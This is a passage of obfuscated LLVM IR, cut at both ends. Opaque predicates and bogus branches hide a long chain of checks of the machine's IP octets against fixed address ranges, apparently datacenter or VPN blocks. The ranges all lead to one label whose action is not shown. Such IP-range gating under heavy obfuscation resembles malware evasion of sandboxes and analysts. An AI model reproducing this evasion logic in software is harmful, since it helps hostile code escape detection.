  %3960 = zext i8 %3959 to i32
  %3961 = icmp eq i32 %3960, 5
  %3962 = load i32, i32* @x.65
  %3963 = load i32, i32* @y.66
  %3964 = sub i32 %3962, 1
  %3965 = mul i32 %3962, %3964
  %3966 = urem i32 %3965, 2
  %3967 = icmp eq i32 %3966, 0
  %3968 = icmp slt i32 %3963, 10
  %3969 = or i1 %3967, %3968
  br i1 %3969, label %originalBBpart2560, label %originalBB558alteredBB

originalBBpart2560:                               ; preds = %originalBB558
  br i1 %3961, label %3970, label %3974

; <label>:3970:                                   ; preds = %originalBBpart2560
  %3971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3972 = zext i8 %3971 to i32
  %3973 = icmp eq i32 %3972, 39
  br i1 %3973, label %5298, label %3974

; <label>:3974:                                   ; preds = %3970, %originalBBpart2560
  %3975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3976 = zext i8 %3975 to i32
  %3977 = icmp eq i32 %3976, 91
  br i1 %3977, label %3978, label %3998

; <label>:3978:                                   ; preds = %3974
  %3979 = load i32, i32* @x.65
  %3980 = load i32, i32* @y.66
  %3981 = sub i32 %3979, 1
  %3982 = mul i32 %3979, %3981
  %3983 = urem i32 %3982, 2
  %3984 = icmp eq i32 %3983, 0
  %3985 = icmp slt i32 %3980, 10
  %3986 = or i1 %3984, %3985
  br i1 %3986, label %originalBB562, label %originalBB562alteredBB

originalBB562:                                    ; preds = %originalBB562alteredBB, %3978
  %3987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3988 = zext i8 %3987 to i32
  %3989 = icmp eq i32 %3988, 134
  %3990 = load i32, i32* @x.65
  %3991 = load i32, i32* @y.66
  %3992 = sub i32 %3990, 1
  %3993 = mul i32 %3990, %3992
  %3994 = urem i32 %3993, 2
  %3995 = icmp eq i32 %3994, 0
  %3996 = icmp slt i32 %3991, 10
  %3997 = or i1 %3995, %3996
  br i1 %3997, label %originalBBpart2564, label %originalBB562alteredBB

originalBBpart2564:                               ; preds = %originalBB562
  br i1 %3989, label %5298, label %3998

; <label>:3998:                                   ; preds = %originalBBpart2564, %3974
  %3999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4000 = zext i8 %3999 to i32
  %4001 = icmp eq i32 %4000, 104
  br i1 %4001, label %4002, label %4030

; <label>:4002:                                   ; preds = %3998
  %4003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4004 = zext i8 %4003 to i32
  %4005 = icmp eq i32 %4004, 200
  br i1 %4005, label %4006, label %4030

; <label>:4006:                                   ; preds = %4002
  %4007 = load i32, i32* @x.65
  %4008 = load i32, i32* @y.66
  %4009 = sub i32 %4007, 1
  %4010 = mul i32 %4007, %4009
  %4011 = urem i32 %4010, 2
  %4012 = icmp eq i32 %4011, 0
  %4013 = icmp slt i32 %4008, 10
  %4014 = or i1 %4012, %4013
  br i1 %4014, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %4006
  %4015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4016 = zext i8 %4015 to i32
  %4017 = icmp sge i32 %4016, 128
  %4018 = load i32, i32* @x.65
  %4019 = load i32, i32* @y.66
  %4020 = sub i32 %4018, 1
  %4021 = mul i32 %4018, %4020
  %4022 = urem i32 %4021, 2
  %4023 = icmp eq i32 %4022, 0
  %4024 = icmp slt i32 %4019, 10
  %4025 = or i1 %4023, %4024
  br i1 %4025, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br i1 %4017, label %4026, label %4030

; <label>:4026:                                   ; preds = %originalBBpart2568
  %4027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4028 = zext i8 %4027 to i32
  %4029 = icmp slt i32 %4028, 159
  br i1 %4029, label %5298, label %4030

; <label>:4030:                                   ; preds = %4026, %originalBBpart2568, %4002, %3998
  %4031 = load i32, i32* @x.65
  %4032 = load i32, i32* @y.66
  %4033 = sub i32 %4031, 1
  %4034 = mul i32 %4031, %4033
  %4035 = urem i32 %4034, 2
  %4036 = icmp eq i32 %4035, 0
  %4037 = icmp slt i32 %4032, 10
  %4038 = or i1 %4036, %4037
  br i1 %4038, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %4030
  %4039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4040 = zext i8 %4039 to i32
  %4041 = icmp eq i32 %4040, 107
  %4042 = load i32, i32* @x.65
  %4043 = load i32, i32* @y.66
  %4044 = sub i32 %4042, 1
  %4045 = mul i32 %4042, %4044
  %4046 = urem i32 %4045, 2
  %4047 = icmp eq i32 %4046, 0
  %4048 = icmp slt i32 %4043, 10
  %4049 = or i1 %4047, %4048
  br i1 %4049, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br i1 %4041, label %4050, label %4062

; <label>:4050:                                   ; preds = %originalBBpart2572
  %4051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4052 = zext i8 %4051 to i32
  %4053 = icmp eq i32 %4052, 152
  br i1 %4053, label %4054, label %4062

; <label>:4054:                                   ; preds = %4050
  %4055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4056 = zext i8 %4055 to i32
  %4057 = icmp sge i32 %4056, 96
  br i1 %4057, label %4058, label %4062

; <label>:4058:                                   ; preds = %4054
  %4059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4060 = zext i8 %4059 to i32
  %4061 = icmp slt i32 %4060, 111
  br i1 %4061, label %5298, label %4062

; <label>:4062:                                   ; preds = %4058, %4054, %4050, %originalBBpart2572
  %4063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4064 = zext i8 %4063 to i32
  %4065 = icmp eq i32 %4064, 107
  br i1 %4065, label %4066, label %4110

; <label>:4066:                                   ; preds = %4062
  %4067 = load i32, i32* @x.65
  %4068 = load i32, i32* @y.66
  %4069 = sub i32 %4067, 1
  %4070 = mul i32 %4067, %4069
  %4071 = urem i32 %4070, 2
  %4072 = icmp eq i32 %4071, 0
  %4073 = icmp slt i32 %4068, 10
  %4074 = or i1 %4072, %4073
  br i1 %4074, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %4066
  %4075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4076 = zext i8 %4075 to i32
  %4077 = icmp eq i32 %4076, 181
  %4078 = load i32, i32* @x.65
  %4079 = load i32, i32* @y.66
  %4080 = sub i32 %4078, 1
  %4081 = mul i32 %4078, %4080
  %4082 = urem i32 %4081, 2
  %4083 = icmp eq i32 %4082, 0
  %4084 = icmp slt i32 %4079, 10
  %4085 = or i1 %4083, %4084
  br i1 %4085, label %originalBBpart2576, label %originalBB574alteredBB

originalBBpart2576:                               ; preds = %originalBB574
  br i1 %4077, label %4086, label %4110

; <label>:4086:                                   ; preds = %originalBBpart2576
  %4087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4088 = zext i8 %4087 to i32
  %4089 = icmp sge i32 %4088, 160
  br i1 %4089, label %4090, label %4110

; <label>:4090:                                   ; preds = %4086
  %4091 = load i32, i32* @x.65
  %4092 = load i32, i32* @y.66
  %4093 = sub i32 %4091, 1
  %4094 = mul i32 %4091, %4093
  %4095 = urem i32 %4094, 2
  %4096 = icmp eq i32 %4095, 0
  %4097 = icmp slt i32 %4092, 10
  %4098 = or i1 %4096, %4097
  br i1 %4098, label %originalBB578, label %originalBB578alteredBB

originalBB578:                                    ; preds = %originalBB578alteredBB, %4090
  %4099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4100 = zext i8 %4099 to i32
  %4101 = icmp slt i32 %4100, 189
  %4102 = load i32, i32* @x.65
  %4103 = load i32, i32* @y.66
  %4104 = sub i32 %4102, 1
  %4105 = mul i32 %4102, %4104
  %4106 = urem i32 %4105, 2
  %4107 = icmp eq i32 %4106, 0
  %4108 = icmp slt i32 %4103, 10
  %4109 = or i1 %4107, %4108
  br i1 %4109, label %originalBBpart2580, label %originalBB578alteredBB

originalBBpart2580:                               ; preds = %originalBB578
  br i1 %4101, label %5298, label %4110

; <label>:4110:                                   ; preds = %originalBBpart2580, %4086, %originalBBpart2576, %4062
  %4111 = load i32, i32* @x.65
  %4112 = load i32, i32* @y.66
  %4113 = sub i32 %4111, 1
  %4114 = mul i32 %4111, %4113
  %4115 = urem i32 %4114, 2
  %4116 = icmp eq i32 %4115, 0
  %4117 = icmp slt i32 %4112, 10
  %4118 = or i1 %4116, %4117
  br i1 %4118, label %originalBB582, label %originalBB582alteredBB

originalBB582:                                    ; preds = %originalBB582alteredBB, %4110
  %4119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4120 = zext i8 %4119 to i32
  %4121 = icmp eq i32 %4120, 172
  %4122 = load i32, i32* @x.65
  %4123 = load i32, i32* @y.66
  %4124 = sub i32 %4122, 1
  %4125 = mul i32 %4122, %4124
  %4126 = urem i32 %4125, 2
  %4127 = icmp eq i32 %4126, 0
  %4128 = icmp slt i32 %4123, 10
  %4129 = or i1 %4127, %4128
  br i1 %4129, label %originalBBpart2584, label %originalBB582alteredBB

originalBBpart2584:                               ; preds = %originalBB582
  br i1 %4121, label %4130, label %4158

; <label>:4130:                                   ; preds = %originalBBpart2584
  %4131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4132 = zext i8 %4131 to i32
  %4133 = icmp eq i32 %4132, 98
  br i1 %4133, label %4134, label %4158

; <label>:4134:                                   ; preds = %4130
  %4135 = load i32, i32* @x.65
  %4136 = load i32, i32* @y.66
  %4137 = sub i32 %4135, 1
  %4138 = mul i32 %4135, %4137
  %4139 = urem i32 %4138, 2
  %4140 = icmp eq i32 %4139, 0
  %4141 = icmp slt i32 %4136, 10
  %4142 = or i1 %4140, %4141
  br i1 %4142, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %4134
  %4143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4144 = zext i8 %4143 to i32
  %4145 = icmp sge i32 %4144, 64
  %4146 = load i32, i32* @x.65
  %4147 = load i32, i32* @y.66
  %4148 = sub i32 %4146, 1
  %4149 = mul i32 %4146, %4148
  %4150 = urem i32 %4149, 2
  %4151 = icmp eq i32 %4150, 0
  %4152 = icmp slt i32 %4147, 10
  %4153 = or i1 %4151, %4152
  br i1 %4153, label %originalBBpart2588, label %originalBB586alteredBB

originalBBpart2588:                               ; preds = %originalBB586
  br i1 %4145, label %4154, label %4158

; <label>:4154:                                   ; preds = %originalBBpart2588
  %4155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4156 = zext i8 %4155 to i32
  %4157 = icmp slt i32 %4156, 95
  br i1 %4157, label %5298, label %4158

; <label>:4158:                                   ; preds = %4154, %originalBBpart2588, %4130, %originalBBpart2584
  %4159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4160 = zext i8 %4159 to i32
  %4161 = icmp eq i32 %4160, 184
  br i1 %4161, label %4162, label %4190

; <label>:4162:                                   ; preds = %4158
  %4163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4164 = zext i8 %4163 to i32
  %4165 = icmp eq i32 %4164, 170
  br i1 %4165, label %4166, label %4190

; <label>:4166:                                   ; preds = %4162
  %4167 = load i32, i32* @x.65
  %4168 = load i32, i32* @y.66
  %4169 = sub i32 %4167, 1
  %4170 = mul i32 %4167, %4169
  %4171 = urem i32 %4170, 2
  %4172 = icmp eq i32 %4171, 0
  %4173 = icmp slt i32 %4168, 10
  %4174 = or i1 %4172, %4173
  br i1 %4174, label %originalBB590, label %originalBB590alteredBB

originalBB590:                                    ; preds = %originalBB590alteredBB, %4166
  %4175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4176 = zext i8 %4175 to i32
  %4177 = icmp sge i32 %4176, 240
  %4178 = load i32, i32* @x.65
  %4179 = load i32, i32* @y.66
  %4180 = sub i32 %4178, 1
  %4181 = mul i32 %4178, %4180
  %4182 = urem i32 %4181, 2
  %4183 = icmp eq i32 %4182, 0
  %4184 = icmp slt i32 %4179, 10
  %4185 = or i1 %4183, %4184
  br i1 %4185, label %originalBBpart2592, label %originalBB590alteredBB

originalBBpart2592:                               ; preds = %originalBB590
  br i1 %4177, label %4186, label %4190

; <label>:4186:                                   ; preds = %originalBBpart2592
  %4187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4188 = zext i8 %4187 to i32
  %4189 = icmp slt i32 %4188, 255
  br i1 %4189, label %5298, label %4190

; <label>:4190:                                   ; preds = %4186, %originalBBpart2592, %4162, %4158
  %4191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4192 = zext i8 %4191 to i32
  %4193 = icmp eq i32 %4192, 192
  br i1 %4193, label %4194, label %4238

; <label>:4194:                                   ; preds = %4190
  %4195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4196 = zext i8 %4195 to i32
  %4197 = icmp eq i32 %4196, 111
  br i1 %4197, label %4198, label %4238

; <label>:4198:                                   ; preds = %4194
  %4199 = load i32, i32* @x.65
  %4200 = load i32, i32* @y.66
  %4201 = sub i32 %4199, 1
  %4202 = mul i32 %4199, %4201
  %4203 = urem i32 %4202, 2
  %4204 = icmp eq i32 %4203, 0
  %4205 = icmp slt i32 %4200, 10
  %4206 = or i1 %4204, %4205
  br i1 %4206, label %originalBB594, label %originalBB594alteredBB

originalBB594:                                    ; preds = %originalBB594alteredBB, %4198
  %4207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4208 = zext i8 %4207 to i32
  %4209 = icmp sge i32 %4208, 128
  %4210 = load i32, i32* @x.65
  %4211 = load i32, i32* @y.66
  %4212 = sub i32 %4210, 1
  %4213 = mul i32 %4210, %4212
  %4214 = urem i32 %4213, 2
  %4215 = icmp eq i32 %4214, 0
  %4216 = icmp slt i32 %4211, 10
  %4217 = or i1 %4215, %4216
  br i1 %4217, label %originalBBpart2596, label %originalBB594alteredBB

originalBBpart2596:                               ; preds = %originalBB594
  br i1 %4209, label %4218, label %4238

; <label>:4218:                                   ; preds = %originalBBpart2596
  %4219 = load i32, i32* @x.65
  %4220 = load i32, i32* @y.66
  %4221 = sub i32 %4219, 1
  %4222 = mul i32 %4219, %4221
  %4223 = urem i32 %4222, 2
  %4224 = icmp eq i32 %4223, 0
  %4225 = icmp slt i32 %4220, 10
  %4226 = or i1 %4224, %4225
  br i1 %4226, label %originalBB598, label %originalBB598alteredBB

originalBB598:                                    ; preds = %originalBB598alteredBB, %4218
  %4227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4228 = zext i8 %4227 to i32
  %4229 = icmp slt i32 %4228, 143
  %4230 = load i32, i32* @x.65
  %4231 = load i32, i32* @y.66
  %4232 = sub i32 %4230, 1
  %4233 = mul i32 %4230, %4232
  %4234 = urem i32 %4233, 2
  %4235 = icmp eq i32 %4234, 0
  %4236 = icmp slt i32 %4231, 10
  %4237 = or i1 %4235, %4236
  br i1 %4237, label %originalBBpart2600, label %originalBB598alteredBB

originalBBpart2600:                               ; preds = %originalBB598
  br i1 %4229, label %5298, label %4238

; <label>:4238:                                   ; preds = %originalBBpart2600, %originalBBpart2596, %4194, %4190
  %4239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4240 = zext i8 %4239 to i32
  %4241 = icmp eq i32 %4240, 192
  br i1 %4241, label %4242, label %4254

; <label>:4242:                                   ; preds = %4238
  %4243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4244 = zext i8 %4243 to i32
  %4245 = icmp eq i32 %4244, 252
  br i1 %4245, label %4246, label %4254

; <label>:4246:                                   ; preds = %4242
  %4247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4248 = zext i8 %4247 to i32
  %4249 = icmp sge i32 %4248, 208
  br i1 %4249, label %4250, label %4254

; <label>:4250:                                   ; preds = %4246
  %4251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4252 = zext i8 %4251 to i32
  %4253 = icmp slt i32 %4252, 223
  br i1 %4253, label %5298, label %4254

; <label>:4254:                                   ; preds = %4250, %4246, %4242, %4238
  %4255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4256 = zext i8 %4255 to i32
  %4257 = icmp eq i32 %4256, 192
  br i1 %4257, label %4258, label %4286

; <label>:4258:                                   ; preds = %4254
  %4259 = load i32, i32* @x.65
  %4260 = load i32, i32* @y.66
  %4261 = sub i32 %4259, 1
  %4262 = mul i32 %4259, %4261
  %4263 = urem i32 %4262, 2
  %4264 = icmp eq i32 %4263, 0
  %4265 = icmp slt i32 %4260, 10
  %4266 = or i1 %4264, %4265
  br i1 %4266, label %originalBB602, label %originalBB602alteredBB

originalBB602:                                    ; preds = %originalBB602alteredBB, %4258
  %4267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4268 = zext i8 %4267 to i32
  %4269 = icmp eq i32 %4268, 40
  %4270 = load i32, i32* @x.65
  %4271 = load i32, i32* @y.66
  %4272 = sub i32 %4270, 1
  %4273 = mul i32 %4270, %4272
  %4274 = urem i32 %4273, 2
  %4275 = icmp eq i32 %4274, 0
  %4276 = icmp slt i32 %4271, 10
  %4277 = or i1 %4275, %4276
  br i1 %4277, label %originalBBpart2604, label %originalBB602alteredBB

originalBBpart2604:                               ; preds = %originalBB602
  br i1 %4269, label %4278, label %4286

; <label>:4278:                                   ; preds = %originalBBpart2604
  %4279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4280 = zext i8 %4279 to i32
  %4281 = icmp sge i32 %4280, 56
  br i1 %4281, label %4282, label %4286

; <label>:4282:                                   ; preds = %4278
  %4283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4284 = zext i8 %4283 to i32
  %4285 = icmp slt i32 %4284, 59
  br i1 %4285, label %5298, label %4286

; <label>:4286:                                   ; preds = %4282, %4278, %originalBBpart2604, %4254
  %4287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4288 = zext i8 %4287 to i32
  %4289 = icmp eq i32 %4288, 198
  br i1 %4289, label %4290, label %4318

; <label>:4290:                                   ; preds = %4286
  %4291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4292 = zext i8 %4291 to i32
  %4293 = icmp eq i32 %4292, 8
  br i1 %4293, label %4294, label %4318

; <label>:4294:                                   ; preds = %4290
  %4295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4296 = zext i8 %4295 to i32
  %4297 = icmp sge i32 %4296, 81
  br i1 %4297, label %4298, label %4318

; <label>:4298:                                   ; preds = %4294
  %4299 = load i32, i32* @x.65
  %4300 = load i32, i32* @y.66
  %4301 = sub i32 %4299, 1
  %4302 = mul i32 %4299, %4301
  %4303 = urem i32 %4302, 2
  %4304 = icmp eq i32 %4303, 0
  %4305 = icmp slt i32 %4300, 10
  %4306 = or i1 %4304, %4305
  br i1 %4306, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %4298
  %4307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4308 = zext i8 %4307 to i32
  %4309 = icmp slt i32 %4308, 95
  %4310 = load i32, i32* @x.65
  %4311 = load i32, i32* @y.66
  %4312 = sub i32 %4310, 1
  %4313 = mul i32 %4310, %4312
  %4314 = urem i32 %4313, 2
  %4315 = icmp eq i32 %4314, 0
  %4316 = icmp slt i32 %4311, 10
  %4317 = or i1 %4315, %4316
  br i1 %4317, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br i1 %4309, label %5298, label %4318

; <label>:4318:                                   ; preds = %originalBBpart2608, %4294, %4290, %4286
  %4319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4320 = zext i8 %4319 to i32
  %4321 = icmp eq i32 %4320, 199
  br i1 %4321, label %4322, label %4350

; <label>:4322:                                   ; preds = %4318
  %4323 = load i32, i32* @x.65
  %4324 = load i32, i32* @y.66
  %4325 = sub i32 %4323, 1
  %4326 = mul i32 %4323, %4325
  %4327 = urem i32 %4326, 2
  %4328 = icmp eq i32 %4327, 0
  %4329 = icmp slt i32 %4324, 10
  %4330 = or i1 %4328, %4329
  br i1 %4330, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %4322
  %4331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4332 = zext i8 %4331 to i32
  %4333 = icmp eq i32 %4332, 116
  %4334 = load i32, i32* @x.65
  %4335 = load i32, i32* @y.66
  %4336 = sub i32 %4334, 1
  %4337 = mul i32 %4334, %4336
  %4338 = urem i32 %4337, 2
  %4339 = icmp eq i32 %4338, 0
  %4340 = icmp slt i32 %4335, 10
  %4341 = or i1 %4339, %4340
  br i1 %4341, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br i1 %4333, label %4342, label %4350

; <label>:4342:                                   ; preds = %originalBBpart2612
  %4343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4344 = zext i8 %4343 to i32
  %4345 = icmp sge i32 %4344, 112
  br i1 %4345, label %4346, label %4350

; <label>:4346:                                   ; preds = %4342
  %4347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4348 = zext i8 %4347 to i32
  %4349 = icmp slt i32 %4348, 119
  br i1 %4349, label %5298, label %4350

; <label>:4350:                                   ; preds = %4346, %4342, %originalBBpart2612, %4318
  %4351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4352 = zext i8 %4351 to i32
  %4353 = icmp eq i32 %4352, 199
  br i1 %4353, label %4354, label %4398

; <label>:4354:                                   ; preds = %4350
  %4355 = load i32, i32* @x.65
  %4356 = load i32, i32* @y.66
  %4357 = sub i32 %4355, 1
  %4358 = mul i32 %4355, %4357
  %4359 = urem i32 %4358, 2
  %4360 = icmp eq i32 %4359, 0
  %4361 = icmp slt i32 %4356, 10
  %4362 = or i1 %4360, %4361
  br i1 %4362, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %4354
  %4363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4364 = zext i8 %4363 to i32
  %4365 = icmp eq i32 %4364, 229
  %4366 = load i32, i32* @x.65
  %4367 = load i32, i32* @y.66
  %4368 = sub i32 %4366, 1
  %4369 = mul i32 %4366, %4368
  %4370 = urem i32 %4369, 2
  %4371 = icmp eq i32 %4370, 0
  %4372 = icmp slt i32 %4367, 10
  %4373 = or i1 %4371, %4372
  br i1 %4373, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %4365, label %4374, label %4398

; <label>:4374:                                   ; preds = %originalBBpart2616
  %4375 = load i32, i32* @x.65
  %4376 = load i32, i32* @y.66
  %4377 = sub i32 %4375, 1
  %4378 = mul i32 %4375, %4377
  %4379 = urem i32 %4378, 2
  %4380 = icmp eq i32 %4379, 0
  %4381 = icmp slt i32 %4376, 10
  %4382 = or i1 %4380, %4381
  br i1 %4382, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %4374
  %4383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4384 = zext i8 %4383 to i32
  %4385 = icmp sge i32 %4384, 248
  %4386 = load i32, i32* @x.65
  %4387 = load i32, i32* @y.66
  %4388 = sub i32 %4386, 1
  %4389 = mul i32 %4386, %4388
  %4390 = urem i32 %4389, 2
  %4391 = icmp eq i32 %4390, 0
  %4392 = icmp slt i32 %4387, 10
  %4393 = or i1 %4391, %4392
  br i1 %4393, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br i1 %4385, label %4394, label %4398

; <label>:4394:                                   ; preds = %originalBBpart2620
  %4395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4396 = zext i8 %4395 to i32
  %4397 = icmp slt i32 %4396, 255
  br i1 %4397, label %5298, label %4398

; <label>:4398:                                   ; preds = %4394, %originalBBpart2620, %originalBBpart2616, %4350
  %4399 = load i32, i32* @x.65
  %4400 = load i32, i32* @y.66
  %4401 = sub i32 %4399, 1
  %4402 = mul i32 %4399, %4401
  %4403 = urem i32 %4402, 2
  %4404 = icmp eq i32 %4403, 0
  %4405 = icmp slt i32 %4400, 10
  %4406 = or i1 %4404, %4405
  br i1 %4406, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %4398
  %4407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4408 = zext i8 %4407 to i32
  %4409 = icmp eq i32 %4408, 199
  %4410 = load i32, i32* @x.65
  %4411 = load i32, i32* @y.66
  %4412 = sub i32 %4410, 1
  %4413 = mul i32 %4410, %4412
  %4414 = urem i32 %4413, 2
  %4415 = icmp eq i32 %4414, 0
  %4416 = icmp slt i32 %4411, 10
  %4417 = or i1 %4415, %4416
  br i1 %4417, label %originalBBpart2624, label %originalBB622alteredBB

originalBBpart2624:                               ; preds = %originalBB622
  br i1 %4409, label %4418, label %4446

; <label>:4418:                                   ; preds = %originalBBpart2624
  %4419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4420 = zext i8 %4419 to i32
  %4421 = icmp eq i32 %4420, 36
  br i1 %4421, label %4422, label %4446

; <label>:4422:                                   ; preds = %4418
  %4423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4424 = zext i8 %4423 to i32
  %4425 = icmp sge i32 %4424, 220
  br i1 %4425, label %4426, label %4446

; <label>:4426:                                   ; preds = %4422
  %4427 = load i32, i32* @x.65
  %4428 = load i32, i32* @y.66
  %4429 = sub i32 %4427, 1
  %4430 = mul i32 %4427, %4429
  %4431 = urem i32 %4430, 2
  %4432 = icmp eq i32 %4431, 0
  %4433 = icmp slt i32 %4428, 10
  %4434 = or i1 %4432, %4433
  br i1 %4434, label %originalBB626, label %originalBB626alteredBB

originalBB626:                                    ; preds = %originalBB626alteredBB, %4426
  %4435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4436 = zext i8 %4435 to i32
  %4437 = icmp slt i32 %4436, 223
  %4438 = load i32, i32* @x.65
  %4439 = load i32, i32* @y.66
  %4440 = sub i32 %4438, 1
  %4441 = mul i32 %4438, %4440
  %4442 = urem i32 %4441, 2
  %4443 = icmp eq i32 %4442, 0
  %4444 = icmp slt i32 %4439, 10
  %4445 = or i1 %4443, %4444
  br i1 %4445, label %originalBBpart2628, label %originalBB626alteredBB

originalBBpart2628:                               ; preds = %originalBB626
  br i1 %4437, label %5298, label %4446

; <label>:4446:                                   ; preds = %originalBBpart2628, %4422, %4418, %originalBBpart2624
  %4447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4448 = zext i8 %4447 to i32
  %4449 = icmp eq i32 %4448, 199
  br i1 %4449, label %4450, label %4478

